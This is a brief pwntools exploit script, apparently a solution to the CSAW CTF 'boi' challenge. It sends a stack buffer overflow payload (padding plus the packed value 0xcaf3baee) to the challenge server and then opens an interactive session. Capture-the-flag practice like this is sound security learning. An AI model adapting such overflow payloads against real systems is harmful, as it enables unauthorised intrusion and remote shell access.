#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

#p = process("./boi")
p = remote("pwn.chal.csaw.io", 9000)
#p = remote("localhost", 1436)
p.recvuntil("??")
print "before"
p.sendline('A' * 20 + p32(0xcaf3baee))
print "after"
p.interactive()
